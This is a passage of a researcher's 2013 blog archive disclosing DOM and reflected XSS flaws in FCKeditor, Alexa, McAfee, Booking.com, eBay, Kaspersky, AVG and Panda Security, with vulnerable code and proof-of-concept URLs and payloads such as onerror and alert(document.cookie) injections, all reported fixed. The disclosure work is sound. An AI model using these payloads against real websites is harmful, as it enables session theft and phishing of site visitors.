12 Apr 2013: Full disclosure

Posted by
David

at

[2:27 AM](http://davidsopaslabs.blogspot.com/2013/04/phpmyadmin-xss_12.html "permanent link")

[No comments:](http://davidsopaslabs.blogspot.com/2013/04/phpmyadmin-xss_12.html#comment-form)

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4083252652650482806&postID=4025624319723888598&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=4025624319723888598&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=4025624319723888598&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=4025624319723888598&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=4025624319723888598&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=4025624319723888598&target=pinterest "Share to Pinterest")

Labels:
[dom xss](http://davidsopaslabs.blogspot.com/search/label/dom%20xss),
[phpmyadmin](http://davidsopaslabs.blogspot.com/search/label/phpmyadmin),
[self-xss](http://davidsopaslabs.blogspot.com/search/label/self-xss)

## Sunday, March 24, 2013

### [XSS on FCKeditor](http://davidsopaslabs.blogspot.com/2013/03/xss-on-fckeditor.html)

What's FCKeditor?

FCKeditor is a ready-for-use open source WYSIWYG text editor from CKSource designed to bring common word processor features directly to web pages, simplifying their content creation. It aims to be lightweight and requires no client-side installation. This tool is already deprecated and was updated to CKEditor but still many open-source projects use FCKeditor.

When using Drupal and PHPList I come across something that caught my attention. The about page (*fck\_about.html*) of FCKeditor showed a window with the User-Agent, Browser and Platform. I thought to myself: *I think we can inject something into this window*.

I checked the source code and voilà...
> document.write( '<b>User Agent<\/b><br />' + window.navigator.userAgent + '<br /><br />' ) ;
> document.write( '<b>Browser<\/b><br />' + window.navigator.appName + ' ' + window.navigator.appVersion + '<br /><br />' ) ;
> document.write( '<b>Platform<\/b><br />' + window.navigator.platform + '<br /><br />' ) ;

The lack of sanitizing those parameters will allow code to be executed on the browser.

To give a proof-of-concept, I used a Chrome plugin to change the User-Agent for a XSS vector.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjDm_1ZUs6RYA7WpUYyaThho4NXrhGoy2tAVengavJni4jxTww1G8fqXWce9AhUGl-58B56TME-Ffs2n-rdyE9pgo2Pwdh01UpJn7O1j5Bn-g848NX9nrXnMu5wKcDlxB_jXdIyEG8-1kJ6/s320/fckeditor1.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjDm_1ZUs6RYA7WpUYyaThho4NXrhGoy2tAVengavJni4jxTww1G8fqXWce9AhUGl-58B56TME-Ffs2n-rdyE9pgo2Pwdh01UpJn7O1j5Bn-g848NX9nrXnMu5wKcDlxB_jXdIyEG8-1kJ6/s1600/fckeditor1.jpg)

Of course this vulnerability is not critical. It requires user interaction to exploit this. You always need to control the victims browser to execute an attack. Needless to say that if you have the victims browser the attacker didn't need to inject a XSS (IMO)...

It's a self-XSS so it needs more than a link to attack someone. It needs to be combined with other attack, like good social engineering skills. I reported this issue because even a self-XSS it's a vulnerability. It can be used to check vendors security response; what kind of vulnerabilities are most common on their products; etc.

By the way FCKeditor is still used in millions of websites and just to be sure update your version.

This issue was fixed on version 2.6.10.
> We would like to announce a small update to FCKeditor. FCKeditor 2.6.10 is a minor security release that contains a fix for a recently reported issue where the About dialog window could hypothetically be used for an XSS attack provided that the user was forced by the attacker to change his browser properties.
> Please note FCKeditor is a retired and no longer supported product. No further updates will be provided and it is highly recommended to upgrade to its successor, CKEditor, that is a far superior, feature-rich, and mature product.

Also present in 2.6.10 changelog:
> Values displayed in the "About" dialog window were not properly escaped - reported by David Sopas.

My congrats to the [CKSource](http://cksource.com/) team for the fast support showing that they're a company that cares about security.

Posted by
David

at

[11:15 AM](http://davidsopaslabs.blogspot.com/2013/03/xss-on-fckeditor.html "permanent link")

[No comments:](http://davidsopaslabs.blogspot.com/2013/03/xss-on-fckeditor.html#comment-form)

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4083252652650482806&postID=2056131804879926010&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=2056131804879926010&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=2056131804879926010&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=2056131804879926010&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=2056131804879926010&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=2056131804879926010&target=pinterest "Share to Pinterest")

Labels:
[ckeditor](http://davidsopaslabs.blogspot.com/search/label/ckeditor),
[fckeditor](http://davidsopaslabs.blogspot.com/search/label/fckeditor),
[self-xss](http://davidsopaslabs.blogspot.com/search/label/self-xss),
[user-agent](http://davidsopaslabs.blogspot.com/search/label/user-agent),
[xss](http://davidsopaslabs.blogspot.com/search/label/xss)

## Monday, March 18, 2013

### [Alexa reflected DOM XSS](http://davidsopaslabs.blogspot.com/2013/03/alexa-reflected-dom-xss.html)

Alexa Internet, Inc. is a California-based subsidiary company of Amazon.com which provides commercial web traffic data. Once it is installed, the Alexa Toolbar collects data on browsing behavior and transmits it to the Alexa website, where it is stored and analyzed, forming the basis for the company's web traffic reporting. As of 2013, Alexa provides traffic data, global rankings and other information on 30 million websites, and claims that 6 million people visit its website monthly.

When using [Alexa.com](http://alexa.com/) website I found a reflected DOM XSS that could be used by malicious users to trick innocent visitors.

This vulnerability was present at tags.js from a remote location and the variable "tagSrc" lacked the proper sanitizing.

Vulnerable code:
> t.tagSrc = '<div align="center">'+t.tagSrc+'</div>';
>
> document.writeln(t.tagSrc);

When modifying the URL you can inject the code you want:
> http://www.alexa.com/tfBuster.html#?flashVer=11&ver=1.25&th=11117008646&tagKey=4138765495&site=alexacom"></script><script>alert(document.cookie);</script><!--&adSpace=miscellanious&center=1&env=display

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhoic61eYeX7rseNIKmMVGvRV_WLqAzY4bA9zyyvckdGxPnUJHdZyzSFbvDVaPEBaCm0SBOLJ6566JeV_xas-d3wBuLBvaGR9L5yzmv4Ruo9dg5FPjhJWSlFrDBOCw2PNkvSGKSQHdmbWBK/s320/screenshot.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhoic61eYeX7rseNIKmMVGvRV_WLqAzY4bA9zyyvckdGxPnUJHdZyzSFbvDVaPEBaCm0SBOLJ6566JeV_xas-d3wBuLBvaGR9L5yzmv4Ruo9dg5FPjhJWSlFrDBOCw2PNkvSGKSQHdmbWBK/s1600/screenshot.png)

This issue already has been fixed but it took more than 3 months. It's strange that a company that's so big couldn't fix this type of vulnerability faster.

Malicious users could use this DOM XSS to spread phishing campaigns with a higher success rate.

Timeline:

13 December 2012: Reported this issue.

13 December 2012: Alexa replied and forwarded to engineering team.

26 December 2012: I requested a follow-up. They replied that still unpatched.

15 March 2013: Alexa replied that the DOM XSS has been fixed.

Posted by
David

at

[12:27 PM](http://davidsopaslabs.blogspot.com/2013/03/alexa-reflected-dom-xss.html "permanent link")

[2 comments:](http://davidsopaslabs.blogspot.com/2013/03/alexa-reflected-dom-xss.html#comment-form)

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4083252652650482806&postID=478857636920639904&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=478857636920639904&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=478857636920639904&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=478857636920639904&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=478857636920639904&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=478857636920639904&target=pinterest "Share to Pinterest")

Labels:
[alexa](http://davidsopaslabs.blogspot.com/search/label/alexa),
[amazon](http://davidsopaslabs.blogspot.com/search/label/amazon),
[dom xss](http://davidsopaslabs.blogspot.com/search/label/dom%20xss)

## Tuesday, February 26, 2013

### [McAfee DOM XSS](http://davidsopaslabs.blogspot.com/2013/02/mcafee-dom-xss.html)

After [Panda Security](http://labs.davidsopas.com/2013/01/panda-security-vulnerable-to-dom-xss.html), [AVG](http://labs.davidsopas.com/2013/01/avg-vulnerable-to-dom-xss.html), [Kaspersky](http://labs.davidsopas.com/2013/01/kaspersky-dom-xss.html) and continuing my project to find XSS flaws on antivirus vendors, I found out a DOM XSS vulnerability located at the [McAfee](http://www.mcafee.com/) website:
> http://www.mcafee.com/us/mcafee-labs.aspx

A user could inject code for example:
> <img src=f00bar onerror=prompt("xss");>

...on the input text in the form "Search the Threat Library".

When changing the select box it will get the XSS vector executed on the browser.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiqVNZKjGBWyWK_VbIkrPMp7EJI4cQCjYfDPbGYt1ie44JJjp4O9foGn01WL84sppgVILuDOeG6priTM_Iz9U397hDJha-WTJRPBDLPQkrirk6GNegAp2IbkLz9wHTCDKis8oFUcqFlHfAl/s320/mcafee.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiqVNZKjGBWyWK_VbIkrPMp7EJI4cQCjYfDPbGYt1ie44JJjp4O9foGn01WL84sppgVILuDOeG6priTM_Iz9U397hDJha-WTJRPBDLPQkrirk6GNegAp2IbkLz9wHTCDKis8oFUcqFlHfAl/s1600/mcafee.png)

This "self-XSS" it's a minor security issue but still can be used to trick other users and a good way to check the security policies of McAfee.

 Keep in mind that this issue has been fixed.

My congratulations on the good and fast support from McAfee security team.

Posted by
David

at

[1:58 PM](http://davidsopaslabs.blogspot.com/2013/02/mcafee-dom-xss.html "permanent link")

[No comments:](http://davidsopaslabs.blogspot.com/2013/02/mcafee-dom-xss.html#comment-form)

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4083252652650482806&postID=1550674283239756403&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=1550674283239756403&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=1550674283239756403&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=1550674283239756403&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=1550674283239756403&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=1550674283239756403&target=pinterest "Share to Pinterest")

Labels:
[antivirus](http://davidsopaslabs.blogspot.com/search/label/antivirus),
[dom xss](http://davidsopaslabs.blogspot.com/search/label/dom%20xss),
[mcafee](http://davidsopaslabs.blogspot.com/search/label/mcafee)

## Wednesday, February 13, 2013

### [DOM XSS vulnerabilities on Booking.com](http://davidsopaslabs.blogspot.com/2013/02/dom-xss-vulnerabilities-on-bookingcom.html)

[Booking.com](http://www.booking.com/) B.V., part of Priceline.com (Nasdaq: PCLN), owns and operates Booking.com, the world leader in booking accommodation online. Each day, over 400,000 room nights are reserved on Booking.com, and the website attracts over 30 million unique visitors each month from both the leisure and business sectors worldwide.

On January I started receiving some [phishing emails](http://www.net-security.org/malware_news.php?id=2395) using Booking.com as bait to spread malware.

If these malicious users had the right tools - like for example a XSS vulnerability - they could infect more users. That would not be good...

After browsing a little bit the website I found out two DOM XSS vulnerabilities.

Both vulnerabilities we're explored due to the lack of escaping the location.hash and using an older version of [jQuery](http://www.jquery.com/). That way it was possible for user to inject code into a victims browser DOM.

Proof of concept #1 (iPhone landing)
> http://www.booking.com/general.en-us.html?sid=c81e148e3eceef6c8e2073bc50258a1c;dcid=1;tmpl=docs/iphone\_landing&=&#<img src=x onerror=prompt("xss");>

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhSrcgkDbDNq6txjg8NArLkFrRfzVuJk7rzmnbXl1q25DyGt_OJX9aspjXkRlpcVMvv5DSOs4lj-8dAlqe5NTl5nOIHlGIBzpUSJbEF4FCMTRkULnqbOQD5AMI6l5CntHfl8n8Ko9F0K-eK/s320/booking.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhSrcgkDbDNq6txjg8NArLkFrRfzVuJk7rzmnbXl1q25DyGt_OJX9aspjXkRlpcVMvv5DSOs4lj-8dAlqe5NTl5nOIHlGIBzpUSJbEF4FCMTRkULnqbOQD5AMI6l5CntHfl8n8Ko9F0K-eK/s1600/booking.jpg)

Proof of concept #2 (FAQ section)
> http://www.booking.com/general.en-us.html?dcid=1&sid=c81e148e3eceef6c8e2073bc50258a1c&tmpl=docs/faqmain#<img src=x onerror=prompt("xss");>

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgQ31_LiMQIFwlY7mgedJYPW-inIOxPH1uWOmTF-CsOZHYdxuBVBmrlO7uLR4OeFgSJ6t3qE2TGSyQoV0lHxkweWKK2g_NhV1gNdGSFHN5T53ldZUZ28-VBKY7_QA6_ZdUfahMey9-rGaRe/s320/booking2.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgQ31_LiMQIFwlY7mgedJYPW-inIOxPH1uWOmTF-CsOZHYdxuBVBmrlO7uLR4OeFgSJ6t3qE2TGSyQoV0lHxkweWKK2g_NhV1gNdGSFHN5T53ldZUZ28-VBKY7_QA6_ZdUfahMey9-rGaRe/s1600/booking2.jpg)

Both issues are now fixed.

I only was able to receive any reply from Booking.com team when contacting them via [Twitter](https://twitter.com/bookingcom). After that I established a conversation with their security team who were very effective and fast, solving both vulnerabilities on a couple of hours. They reported that they're working on making the site safer everyday and appreciate any assistance.

Thanks for that.

Posted by
David

at

[8:33 AM](http://davidsopaslabs.blogspot.com/2013/02/dom-xss-vulnerabilities-on-bookingcom.html "permanent link")

[No comments:](http://davidsopaslabs.blogspot.com/2013/02/dom-xss-vulnerabilities-on-bookingcom.html#comment-form)

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4083252652650482806&postID=5991984108104238466&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=5991984108104238466&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=5991984108104238466&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=5991984108104238466&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=5991984108104238466&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=5991984108104238466&target=pinterest "Share to Pinterest")

Labels:
[booking](http://davidsopaslabs.blogspot.com/search/label/booking),
[dom xss](http://davidsopaslabs.blogspot.com/search/label/dom%20xss),
[malware](http://davidsopaslabs.blogspot.com/search/label/malware),
[phishing](http://davidsopaslabs.blogspot.com/search/label/phishing)

## Friday, February 8, 2013

### [eBay XSS vulnerability](http://davidsopaslabs.blogspot.com/2013/02/ebay-xss-vulnerability.html)

How about finding a vulnerability in the biggest online marketplace in world?

When searching on [eBay](http://www.ebay.com/) I found out that it's possible execute a XSS vulnerability on their job search section.

Proof of concept:

On [Ebay Careers](http://ebaycareers.com/), you clicked on the Search Openings and on the Requisition No. you wrote the XSS vector:
> <img src=x onerror=prompt("xss");>

Clicked Search. The following screen doesn't execute the XSS but when you click:
> ?more

...it would open a new window with the XSS executing.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiTgq99isEDWhtl9ocsCe0TwWGPvquJ7dmtadTd60fqARCadzB51a-tA10KiXmimIB_lvrYRbrKRQib9ZKGLdDa9XJVHflVe6jLVtm_HbFgQ7r4teeffV4VP74cNIUGVJRmhQdtbGyN4BRx/s320/ebay_Xss1.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiTgq99isEDWhtl9ocsCe0TwWGPvquJ7dmtadTd60fqARCadzB51a-tA10KiXmimIB_lvrYRbrKRQib9ZKGLdDa9XJVHflVe6jLVtm_HbFgQ7r4teeffV4VP74cNIUGVJRmhQdtbGyN4BRx/s1600/ebay_Xss1.png)

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjdfpvnMdmNo2lsBUnC2PfVn2fjEWRjjbD1EMbXme2mAqsZqkNbEe9E3YT-bWU3q-H80U37pxdeM733rrH-Cx8-bmpBfdNAv_gZpnfOmK06DFx9VLExREZf-sfJzWHLcrp8YYrMn7zuBx-N/s320/ebay_xss2.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjdfpvnMdmNo2lsBUnC2PfVn2fjEWRjjbD1EMbXme2mAqsZqkNbEe9E3YT-bWU3q-H80U37pxdeM733rrH-Cx8-bmpBfdNAv_gZpnfOmK06DFx9VLExREZf-sfJzWHLcrp8YYrMn7zuBx-N/s1600/ebay_xss2.png)

This issue has been fixed and some pages removed.

I want to thank eBay security team for the fast reply and putting me on their [Security Researchers Acknowledgment](http://pages.ebay.com/securitycenter/ResearchersAcknowledgement.html) page. By the way, I'm the first portuguese guy in the list...

Posted by
David

at

[12:33 AM](http://davidsopaslabs.blogspot.com/2013/02/ebay-xss-vulnerability.html "permanent link")

[No comments:](http://davidsopaslabs.blogspot.com/2013/02/ebay-xss-vulnerability.html#comment-form)

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4083252652650482806&postID=9166401613977241009&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=9166401613977241009&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=9166401613977241009&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=9166401613977241009&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=9166401613977241009&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=9166401613977241009&target=pinterest "Share to Pinterest")

Labels:
[ebay](http://davidsopaslabs.blogspot.com/search/label/ebay),
[xss](http://davidsopaslabs.blogspot.com/search/label/xss)

## Tuesday, February 5, 2013

### [Disable Blogger.com toolbar](http://davidsopaslabs.blogspot.com/2013/02/disable-bloggercom-toolbar.html)

When playing around with my blog I discovered that is possible to temporary disable the [blogger.com](http://blogger.com/) toolbar just adding a new parameter to the URL.

This is not a security issue and should not be considered a threat to any user or blog.

Think of it like a easter egg :-)

It's quite simple to replicate.

Just adding:
> #&jsh=

... to the URL of any blogger account (works also with a domain associated to blogger) will disable Google Plus buttons and the toolbar.

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjx8yytUclJVLZwGmhEMJ-eGfEZCT4c09aMNhZdREDMDTM0uWuA2nfl2sEpQkXqQQ79Nfz311YDv3dgX1zS7rBGUUScTqQxijyxpuvC8mWfxf_ccTg5rfVWaA5Uh67plzPlb7xPQw5NDQxF/s320/blogger.png)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjx8yytUclJVLZwGmhEMJ-eGfEZCT4c09aMNhZdREDMDTM0uWuA2nfl2sEpQkXqQQ79Nfz311YDv3dgX1zS7rBGUUScTqQxijyxpuvC8mWfxf_ccTg5rfVWaA5Uh67plzPlb7xPQw5NDQxF/s1600/blogger.png)

Google reported that will fix this issue as soon as possible.

Posted by
David

at

[11:32 AM](http://davidsopaslabs.blogspot.com/2013/02/disable-bloggercom-toolbar.html "permanent link")

[No comments:](http://davidsopaslabs.blogspot.com/2013/02/disable-bloggercom-toolbar.html#comment-form)

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4083252652650482806&postID=4068449897800323577&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=4068449897800323577&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=4068449897800323577&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=4068449897800323577&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=4068449897800323577&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=4068449897800323577&target=pinterest "Share to Pinterest")

Labels:
[blogger](http://davidsopaslabs.blogspot.com/search/label/blogger),
[easter egg](http://davidsopaslabs.blogspot.com/search/label/easter%20egg),
[google](http://davidsopaslabs.blogspot.com/search/label/google)

## Sunday, January 20, 2013

### [Kaspersky DOM XSS](http://davidsopaslabs.blogspot.com/2013/01/kaspersky-dom-xss.html)

Following my study on DOM XSS and [antivirus](http://labs.davidsopas.com/search/label/antivirus) vendors, I found that [Kaspersky](http://www.kaspersky.com/) is also vulnerable to this type of vulnerability.

The problem is located on a bad validation of location.hash coming from [jQuery](http://www.jquery.com/) (which is also outdated).
> /\*load current tab by url\*/
>
> //if($.url.param("tab")) $('a[name='+$.url.param("tab")+']').trigger('click');
>
> var hash = location.hash;
>
> if (hash.indexOf("tab=") != -1) {
>
> hash = hash.replace(/^#tab=/, "");
>
> $('a[name=' + hash + ']').trigger('click');
>
> }

If a user loads the "tab" parameter on the URL it will execute the code.

Proof of concept:
> http://www.kaspersky.com/tablet-security#tab=<img src=x onerror=prompt("xss");>

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEigQzMQG5Dr1IzeS3Vspj78D5_dHtM62UZr8ABLr9kAw-g-3x0Dwkuqnmrw0-zc62jKGbzo8gKerutt-5OzA6JtiYSBRHFhf7jC-K5YLmQQz6h6JUe5lnQYdQnXDuDXoVCt8eC-SEogyWkx/s320/kaspersky.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEigQzMQG5Dr1IzeS3Vspj78D5_dHtM62UZr8ABLr9kAw-g-3x0Dwkuqnmrw0-zc62jKGbzo8gKerutt-5OzA6JtiYSBRHFhf7jC-K5YLmQQz6h6JUe5lnQYdQnXDuDXoVCt8eC-SEogyWkx/s1600/kaspersky.jpg)

The Kaspersky team fixed this issue very fast and I would like to thank [@assolini](https://twitter.com/assolini) from Kaspersky for the support and the gift.

Posted by
David

at

[5:58 AM](http://davidsopaslabs.blogspot.com/2013/01/kaspersky-dom-xss.html "permanent link")

[No comments:](http://davidsopaslabs.blogspot.com/2013/01/kaspersky-dom-xss.html#comment-form)

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4083252652650482806&postID=2545527286586449273&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=2545527286586449273&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=2545527286586449273&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=2545527286586449273&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=2545527286586449273&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=2545527286586449273&target=pinterest "Share to Pinterest")

Labels:
[antivirus](http://davidsopaslabs.blogspot.com/search/label/antivirus),
[dom xss](http://davidsopaslabs.blogspot.com/search/label/dom%20xss),
[kaspersky](http://davidsopaslabs.blogspot.com/search/label/kaspersky)

### [AVG vulnerable to DOM XSS](http://davidsopaslabs.blogspot.com/2013/01/avg-vulnerable-to-dom-xss.html)

I discovered a DOM XSS vulnerability in [AVG](http://www.avg.com/) and it's located on download section of the oficial website.

Due to the lack of escaping/encoding the URL on the code present on file js\_stdfull.js, a user could inject code into the website.

Vulnerable code:
> //display the correct tab based on the url (#name)
>
> var pathname = $(location).attr('href');var urlparts = pathname.split("#");

Proof of concept:
> http://www.avg.com/eu-en/download#"><img src=x onerror=prompt(/xss/);>

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjHoTYQZNmLgzdm1n9adS8yH3aGwQ7lJCkCE4FzyTk-WnuHcCA8SFe-lRXvEJRAdraZfHkZ60ddr0-dDU33CsN5deWgbHfV3OxwLgGfLkU5LOFlEfIP1SrwlC4u_1MLKgr3E7ob7ylIkOh8/s320/avg.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjHoTYQZNmLgzdm1n9adS8yH3aGwQ7lJCkCE4FzyTk-WnuHcCA8SFe-lRXvEJRAdraZfHkZ60ddr0-dDU33CsN5deWgbHfV3OxwLgGfLkU5LOFlEfIP1SrwlC4u_1MLKgr3E7ob7ylIkOh8/s1600/avg.jpg)

This XSS vector worked fine with Chrome but you could changed it to work with other browsers also.

This issue is already been fixed but didn't got any reply from their team.

Posted by
David

at

[5:03 AM](http://davidsopaslabs.blogspot.com/2013/01/avg-vulnerable-to-dom-xss.html "permanent link")

[3 comments:](http://davidsopaslabs.blogspot.com/2013/01/avg-vulnerable-to-dom-xss.html#comment-form)

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4083252652650482806&postID=1665650418243789663&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=1665650418243789663&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=1665650418243789663&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=1665650418243789663&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=1665650418243789663&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=1665650418243789663&target=pinterest "Share to Pinterest")

Labels:
[antivirus](http://davidsopaslabs.blogspot.com/search/label/antivirus),
[avg](http://davidsopaslabs.blogspot.com/search/label/avg),
[dom xss](http://davidsopaslabs.blogspot.com/search/label/dom%20xss)

## Thursday, January 10, 2013

### [Panda Security vulnerable to DOM XSS](http://davidsopaslabs.blogspot.com/2013/01/panda-security-vulnerable-to-dom-xss.html)

```
Who is [Panda](http://www.pandasecurity.com/)?
Panda Security SL, formerly Panda Software, is a computer security company founded in 1990 by Panda's former CEO, Mikel Urizarbarrena, in the city of Bilbao, Spain. Initially centered on the production of antivirus software, the company has expanded its line of applications to include firewall applications, spam and spyware detection applications, cybercrime prevention technology, and other system management and security tools for businesses and home users.

Who uses it?
Panda Security is one of largest antivirus vendor worldwide, so it means lot's of clients.

What seems to be the issue?
There is a DOM XSS vulnerability present on the pandasecurity.com website.

Affected file: aHref.js (eval + location.href)

Vulnerable code:
> var Url = location.href;
> Url = Url.replace(/.*\?(.*?)/,"$1");
> Variables = Url.split ("&");
> for (i = 0; i < Variables.length; i++) {
> Separ = Variables[i].split("=");
> eval ('var _'+Separ[0].toLowerCase()+'="'+Separ[1]+'"');
> }}

Proof of concept:
> http://www.pandasecurity.com/security-promotion/antivirusoffer/portugal/?track=109197";alert("xss by @dsopas");//&gclid=CO7Q3JmqzrQCFUpb3godzC4Ang";alert("xss by @dsopas");//

[![](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiMCBQZjQe362O3fyo5tBIlRl6VZQCgsFyi43D3WZPolzuuo77m-Vz_bwnWwSp9Q8RXN-alp8FKdr7D7Gs09rJENV_CtAR9VTJpdSCrRRvHfnHubs_A57Ld4djXHxW6n4YG8soy4yzhrvuw/s320/pandasecurity.jpg)](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiMCBQZjQe362O3fyo5tBIlRl6VZQCgsFyi43D3WZPolzuuo77m-Vz_bwnWwSp9Q8RXN-alp8FKdr7D7Gs09rJENV_CtAR9VTJpdSCrRRvHfnHubs_A57Ld4djXHxW6n4YG8soy4yzhrvuw/s1600/pandasecurity.jpg)Both track and gclid are exploitable with this issue.

Feedback?
PandaSecurity fixed this issue very fast. My congrats to their support.
```

Posted by
David

at

[11:16 AM](http://davidsopaslabs.blogspot.com/2013/01/panda-security-vulnerable-to-dom-xss.html "permanent link")

[No comments:](http://davidsopaslabs.blogspot.com/2013/01/panda-security-vulnerable-to-dom-xss.html#comment-form)

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4083252652650482806&postID=2589917916778247964&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=2589917916778247964&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=2589917916778247964&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=2589917916778247964&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=2589917916778247964&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=4083252652650482806&postID=2589917916778247964&target=pinterest "Share to Pinterest")

Labels:
[antivirus](http://davidsopaslabs.blogspot.com/search/label/antivirus),
[dom xss](http://davidsopaslabs.blogspot.com/search/label/dom%20xss),
